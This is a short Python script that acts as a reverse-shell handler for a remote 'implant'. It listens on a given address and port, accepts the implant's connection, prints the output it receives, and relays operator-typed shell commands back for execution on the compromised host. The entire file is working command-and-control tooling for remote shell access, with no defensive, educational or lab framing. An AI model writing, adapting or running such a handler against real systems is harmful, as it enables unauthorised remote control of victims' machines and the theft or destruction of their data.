import sys
import socket
import asyncio
import io
import threading
import subprocess
import time

# For receiving implant's output and displaying it on screen
def implantOutput(connection):
	while True:
		try:
			output = connection.recv(1)
			# Make sure the end is recongnized and output is flushed to screen
			print(output.decode(), end="", flush=True)
		except:
			connection.close()
			exit()

# For getting command from user as an input and sending it to implant for execution
def handlerInput(connection):
	while True:
		shellCmd = input("") + '\n'
		try:
			connection.send(shellCmd.encode())
		except:
			connection.close()
			exit()

# Checks for correct number of arguments and prints usage when '-h' or '--help' is passed as an argument
if (len(sys.argv) != 3 or sys.argv[1] == '-h' or sys.argv[1] == '--help'):
	print("Usage: " + sys.argv[0] + " <LOCAL-ADDR> <LPORT>")
	exit()

# Set a socket for reusable binding
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((sys.argv[1], int(sys.argv[2])))

print("[+] Handler Started On " + sys.argv[1] + ":" + sys.argv[2])
print("[+] Listening For Connections ...")

# Start listening
sock.listen(5)

# Accept connection
connection, implant_addr = sock.accept()
print("[+] Connection Received From " + implant_addr[0] + ":" + str(implant_addr[1]))

# Start receiving implant output as a thread
handler_thread = threading.Thread(target=implantOutput, args=[connection, ])
handler_thread.daemon = True
handler_thread.start()

# Start sending user commands to implant as a thread
handler_thread = threading.Thread(target=handlerInput, args=[connection, ])
handler_thread.daemon = True
handler_thread.start()

# Keep it running
while True:
	time.sleep(1)
